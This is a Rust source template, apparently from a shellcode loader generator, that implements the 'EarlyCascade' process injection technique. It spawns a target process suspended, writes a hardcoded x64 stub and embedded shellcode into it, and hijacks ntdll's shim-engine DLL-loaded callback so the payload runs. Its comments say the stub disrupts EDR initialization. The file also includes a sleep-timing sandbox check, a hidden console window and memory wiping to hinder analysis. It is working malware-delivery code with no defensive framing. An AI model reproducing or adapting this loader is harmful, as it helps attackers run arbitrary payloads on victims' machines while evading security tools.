#![windows_subsystem = "windows"]
#![allow(non_snake_case, non_camel_case_types)]

use std::include_bytes;
use std::mem;
use std::ptr::null_mut;
use std::slice;
use std::thread;
use std::time::{Duration, Instant};

use winapi::ctypes::c_void;
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
use winapi::um::processthreadsapi::{
    CreateProcessA, ResumeThread, TerminateProcess, PROCESS_INFORMATION, STARTUPINFOA,
};
use winapi::um::winbase::CREATE_SUSPENDED;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

// EarlyCascade x64 stub (by 0xNinjaCyclone, improved by Karkas)
// Disrupts EDR initialization, disables shim engine, queues APC for shellcode
const X64_STUB: &[u8] = &[
    0x56, 0x57, 0x65, 0x48, 0x8b, 0x14, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x52, 0x18, 0x48,
    0x8d, 0x52, 0x20, 0x52, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0x12, 0x48, 0x3b, 0x14, 0x24, 0x0f, 0x84,
    0x85, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x83, 0xc1,
    0x0a, 0x48, 0x83, 0xe1, 0xf0, 0x48, 0x29, 0xcc, 0x49, 0x89, 0xc9, 0x48, 0x31, 0xc9, 0x48, 0x31,
    0xc0, 0x66, 0xad, 0x38, 0xe0, 0x74, 0x12, 0x3c, 0x61, 0x7d, 0x06, 0x3c, 0x41, 0x7c, 0x02, 0x04,
    0x20, 0x88, 0x04, 0x0c, 0x48, 0xff, 0xc1, 0xeb, 0xe5, 0xc6, 0x04, 0x0c, 0x00, 0x48, 0x89, 0xe6,
    0xe8, 0xfe, 0x00, 0x00, 0x00, 0x4c, 0x01, 0xcc, 0x48, 0xbe, 0xed, 0xb5, 0xd3, 0x22, 0xb5, 0xd2,
    0x77, 0x03, 0x48, 0x39, 0xfe, 0x74, 0xa0, 0x48, 0xbe, 0x75, 0xee, 0x40, 0x70, 0x36, 0xe9, 0x37,
    0xd5, 0x48, 0x39, 0xfe, 0x74, 0x91, 0x48, 0xbe, 0x2b, 0x95, 0x21, 0xa7, 0x74, 0x12, 0xd7, 0x02,
    0x48, 0x39, 0xfe, 0x74, 0x82, 0xe8, 0x05, 0x00, 0x00, 0x00, 0xe9, 0xbc, 0x00, 0x00, 0x00, 0x58,
    0x48, 0x89, 0x42, 0x30, 0xe9, 0x6e, 0xff, 0xff, 0xff, 0x5a, 0x48, 0xb8, 0x11, 0x11, 0x11, 0x11,
    0x11, 0x11, 0x11, 0x11, 0xc6, 0x00, 0x00, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x31, 0xc0, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02,
    0x0f, 0x85, 0x83, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xd0, 0x50,
    0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x58, 0x20, 0x49, 0x01, 0xd3, 0x48, 0x31, 0xc9, 0x8b, 0x48, 0x18,
    0x51, 0x48, 0x85, 0xc9, 0x74, 0x69, 0x48, 0x31, 0xf6, 0x41, 0x8b, 0x33, 0x48, 0x01, 0xd6, 0xe8,
    0x5f, 0x00, 0x00, 0x00, 0x49, 0x83, 0xc3, 0x04, 0x48, 0xff, 0xc9, 0x48, 0xbe, 0x38, 0x22, 0x61,
    0xd4, 0x7c, 0xdf, 0x63, 0x99, 0x48, 0x39, 0xfe, 0x75, 0xd7, 0x58, 0xff, 0xc1, 0x29, 0xc8, 0x91,
    0x58, 0x44, 0x8b, 0x58, 0x24, 0x49, 0x01, 0xd3, 0x66, 0x41, 0x8b, 0x0c, 0x4b, 0x44, 0x8b, 0x58,
    0x1c, 0x49, 0x01, 0xd3, 0x41, 0x8b, 0x04, 0x8b, 0x48, 0x01, 0xd0, 0xeb, 0x43, 0x48, 0xc7, 0xc1,
    0xfe, 0xff, 0xff, 0xff, 0x5a, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x48,
    0x83, 0xec, 0x20, 0xff, 0xd0, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0x5e, 0x48, 0x31, 0xc0, 0xc3, 0x59,
    0x58, 0xeb, 0xf6, 0xbf, 0x05, 0x15, 0x00, 0x00, 0x48, 0x31, 0xc0, 0xac, 0x38, 0xe0, 0x74, 0x0f,
    0x49, 0x89, 0xf8, 0x48, 0xc1, 0xe7, 0x05, 0x4c, 0x01, 0xc7, 0x48, 0x01, 0xc7, 0xeb, 0xe9, 0xc3,
    0xe8, 0xb8, 0xff, 0xff, 0xff,
];

const SHIMS_MARKER: &[u8] = &[0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11];

#[repr(C)]
struct DosHeader {
    e_magic: u16,
    _pad: [u8; 58],
    e_lfanew: i32,
}

#[repr(C)]
struct FileHeader {
    _machine: u16,
    number_of_sections: u16,
    _ts: u32,
    _sym_table: u32,
    _sym_count: u32,
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
struct SectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    _rest: [u8; 24],
}

struct PatternDef {
    data: &'static [u8],
    pc_off: usize,
}

fn pause(ms: u64) {
    thread::sleep(Duration::from_millis(ms));
}

fn check_environment() -> bool {
    let start = Instant::now();
    pause(3000);
    start.elapsed().as_millis() >= 2500
}

fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
    }
    buf.clear();
}

fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack.windows(needle.len()).position(|w| w == needle)
}

fn section_eq(name: &[u8; 8], target: &[u8]) -> bool {
    target.len() <= 8
        && name[..target.len()] == *target
        && name[target.len()..].iter().all(|&b| b == 0)
}

fn encode_ptr(ptr: usize) -> usize {
    unsafe {
        let cookie = *(0x7FFE0330usize as *const u32);
        let xored = (cookie as u64) ^ (ptr as u64);
        xored.rotate_right(cookie & 0x3F) as usize
    }
}

unsafe fn get_sections(
    base: usize,
) -> (
    Option<*const SectionHeader>,
    Option<*const SectionHeader>,
    Option<*const SectionHeader>,
) {
    let dos = base as *const DosHeader;
    let nt_base = base + (*dos).e_lfanew as usize;
    let fh = (nt_base + 4) as *const FileHeader;
    let num = (*fh).number_of_sections as usize;
    let sec_start =
        (fh as usize) + mem::size_of::<FileHeader>() + (*fh).size_of_optional_header as usize;

    let (mut text, mut mrdata, mut data) = (None, None, None);
    for i in 0..num {
        let s = (sec_start + i * mem::size_of::<SectionHeader>()) as *const SectionHeader;
        if section_eq(&(*s).name, b".text") {
            text = Some(s);
        }
        if section_eq(&(*s).name, b".mrdata") {
            mrdata = Some(s);
        }
        if section_eq(&(*s).name, b".data") {
            data = Some(s);
        }
    }

    (text, mrdata, data)
}

unsafe fn find_callback(base: usize) -> Option<(usize, usize)> {
    let (text, mrdata, _) = get_sections(base);
    let text = text?;
    let mrdata = mrdata?;

    // Pattern for: mov edx,[7FFE0330h] / mov eax,edx / mov rdi,[rip+disp32]
    let patterns = [PatternDef {
        data: &[0x8B, 0x14, 0x25, 0x30, 0x03, 0xFE, 0x7F, 0x8B, 0xC2, 0x48, 0x8B, 0x3D],
        pc_off: 4,
    }];

    let t_start = base + (*text).virtual_address as usize;
    let t_bytes = slice::from_raw_parts(t_start as *const u8, (*text).virtual_size as usize);
    let mr_start = base + (*mrdata).virtual_address as usize;
    let mr_end = mr_start + (*mrdata).virtual_size as usize;

    for pat in &patterns {
        let mut off = 0;
        while off < t_bytes.len() {
            if let Some(pos) = find_bytes(&t_bytes[off..], pat.data) {
                let match_end = t_start + off + pos + pat.data.len();
                if *((match_end + 3) as *const u8) == 0x00 {
                    let disp = *(match_end as *const u32) as usize;
                    let target = match_end + disp + pat.pc_off;
                    if target >= mr_start && target < mr_end {
                        return Some((target, match_end));
                    }
                }
                off += pos + pat.data.len();
            } else {
                break;
            }
        }
    }

    None
}

unsafe fn find_shims_flag(base: usize, offset_addr: usize) -> Option<usize> {
    let (_, _, data) = get_sections(base);
    let data = data?;

    // Patterns for: mov byte ptr [rip+disp32], 1 / cmp byte ptr [rip+disp32], r12b
    let patterns = [
        PatternDef { data: &[0xC6, 0x05], pc_off: 5 },
        PatternDef { data: &[0x44, 0x38, 0x25], pc_off: 4 },
    ];

    let d_start = base + (*data).virtual_address as usize;
    let d_end = d_start + (*data).virtual_size as usize;
    let s_start = offset_addr.saturating_sub(0xFF);
    let s_end = offset_addr + 0xFF;
    let s_bytes = slice::from_raw_parts(s_start as *const u8, s_end - s_start);

    for pat in &patterns {
        let mut off = 0;
        while off < s_bytes.len() {
            if let Some(pos) = find_bytes(&s_bytes[off..], pat.data) {
                let match_end = s_start + off + pos + pat.data.len();
                if *((match_end + 3) as *const u8) == 0x00 {
                    let disp = *(match_end as *const u32) as usize;
                    let target = match_end + disp + pat.pc_off;
                    if target >= d_start && target < d_end {
                        return Some(target);
                    }
                }
                off += pos + pat.data.len();
            } else {
                break;
            }
        }
    }

    None
}

unsafe fn do_inject(pi: &PROCESS_INFORMATION, sc: &[u8]) -> bool {
    let h_ntdll = GetModuleHandleA(b"ntdll\0".as_ptr() as *const i8);
    if h_ntdll.is_null() {
        return false;
    }
    let ntdll_base = h_ntdll as usize;

    let (cb_addr, off_addr) = match find_callback(ntdll_base) {
        Some(v) => v,
        None => return false,
    };

    let shims_addr = match find_shims_flag(ntdll_base, off_addr) {
        Some(v) => v,
        None => return false,
    };

    // Patch the stub with the g_ShimsEnabled address
    let mut stub = X64_STUB.to_vec();
    let marker_pos = match find_bytes(&stub, SHIMS_MARKER) {
        Some(p) => p,
        None => return false,
    };
    stub[marker_pos..marker_pos + 8].copy_from_slice(&shims_addr.to_le_bytes());

    let stub_len = stub.len();
    // +1 for NUL byte between stub and shellcode (matches original C sizeof behavior)
    let total = stub_len + 1 + sc.len();

    let buf = VirtualAllocEx(
        pi.hProcess,
        null_mut(),
        total,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if buf.is_null() {
        return false;
    }

    // Shellcode sits right after stub + NUL byte
    let sc_remote = (buf as usize + stub_len + 1) as *mut c_void;

    if WriteProcessMemory(pi.hProcess, buf, stub.as_ptr() as *const c_void, stub_len, null_mut())
        == 0
    {
        return false;
    }

    if WriteProcessMemory(
        pi.hProcess,
        sc_remote,
        sc.as_ptr() as *const c_void,
        sc.len(),
        null_mut(),
    ) == 0
    {
        return false;
    }

    // RW → RX
    let mut old_protect: u32 = 0;
    if VirtualProtectEx(pi.hProcess, buf, total, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
        return false;
    }

    // Wipe local stub copy
    for b in stub.iter_mut() {
        std::ptr::write_volatile(b as *mut u8, 0);
    }

    // Hijack g_pfnSE_DllLoaded callback with encoded pointer to our stub
    let encoded = encode_ptr(buf as usize);
    if WriteProcessMemory(
        pi.hProcess,
        cb_addr as *mut c_void,
        &encoded as *const usize as *const c_void,
        mem::size_of::<usize>(),
        null_mut(),
    ) == 0
    {
        return false;
    }

    // Enable Shim Engine
    let enable: i32 = 1;
    if WriteProcessMemory(
        pi.hProcess,
        shims_addr as *mut c_void,
        &enable as *const i32 as *const c_void,
        mem::size_of::<i32>(),
        null_mut(),
    ) == 0
    {
        return false;
    }

    // Resume thread to trigger the callback
    ResumeThread(pi.hThread) != u32::MAX
}

fn cascade(sc: &[u8]) {
    unsafe {
        let mut cmd = b"{{TARGET_PROCESS}}\0".to_vec();
        let mut si: STARTUPINFOA = mem::zeroed();
        si.cb = mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = mem::zeroed();

        if CreateProcessA(
            null_mut(),
            cmd.as_mut_ptr() as *mut i8,
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        ) == 0
        {
            return;
        }

        let ok = do_inject(&pi, sc);

        if !ok && !pi.hProcess.is_null() {
            TerminateProcess(pi.hProcess, 1);
        }

        if !pi.hThread.is_null() {
            CloseHandle(pi.hThread);
        }
        if !pi.hProcess.is_null() {
            CloseHandle(pi.hProcess);
        }
    }
}

fn main() {
    {{SANDBOX}}

    if !check_environment() { return; }

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    cascade(&vec);
    wipe(&mut vec);
}

{{DLL_MAIN}}
